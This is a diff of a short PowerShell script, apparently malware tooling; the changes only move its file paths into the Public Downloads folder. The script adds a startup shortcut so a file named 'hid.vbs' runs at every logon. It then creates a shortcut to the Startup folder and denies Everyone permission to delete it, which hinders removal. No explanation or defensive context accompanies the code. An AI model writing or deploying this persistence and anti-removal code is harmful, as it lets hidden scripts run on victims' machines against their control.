@@ -1,16 +1,16 @@
-$source = "C:\hid.vbs"
+$source = "C:\Users\Public\Downloads\hid.vbs"
 $destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\hid.vbs.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
 $shortcut.Save()
-$ShortcutPath = "C:\Startup Folder.lnk"
+$ShortcutPath = "C:\Users\Public\Downloads\Startup Folder.lnk"
 $TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
 $Shortcut.TargetPath = $TargetPath
 $Shortcut.Save()
-$folder = "C:\Startup Folder.lnk"
+$folder = "C:\Users\Public\Downloads\Startup Folder.lnk"
 $acl = Get-Acl $folder
 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Delete", "Deny")
 $acl.AddAccessRule($accessRule)
